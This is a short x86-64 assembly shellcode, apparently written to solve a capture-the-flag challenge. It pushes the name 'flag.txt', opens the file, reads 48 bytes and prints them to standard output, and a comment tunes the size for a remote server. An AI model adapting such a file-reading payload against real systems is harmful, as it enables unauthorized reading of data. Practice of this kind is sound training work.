.global _start 
_start:
    .intel_syntax noprefix

	mov rax, 0x0
	push rax    
    mov rax, 0x7478742e67616c66
    push rax              
    mov rdi, rsp          
    mov rsi, 0x0               
    mov rax, 0x2               
    syscall                 

	mov rdi, rax
	mov rdx, 0x30 # shift size to avoid server error
	mov rsi, rsp
	mov rax, 0
	syscall

	mov rax, 1
	mov rdi, 1
	syscall
	